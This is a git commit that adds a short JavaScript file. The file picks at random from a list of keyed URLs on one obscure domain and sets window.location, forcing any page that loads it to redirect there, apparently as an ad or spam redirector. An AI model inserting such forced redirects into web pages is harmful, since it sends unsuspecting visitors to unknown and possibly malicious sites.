9e49f869be74dcce0f8a787ac8c53b016f381596
idhoiphiy <idhoiphiy.o@gmail.com>
2026-05-10 22:13:36 +0700

    Create akeadstmnggu2.js

---
+++ akeadstmnggu2.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/wkr4hi9v?key=57ee67e855faf38e4c7feb082dddb780',
+'https://arkgleamfox.com/rnkxadzk?key=e6a1e5bfa3ece8563d1ebb3ce622da38',
+'https://arkgleamfox.com/rnkxadzk?key=e6a1e5bfa3ece8563d1ebb3ce622da38'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
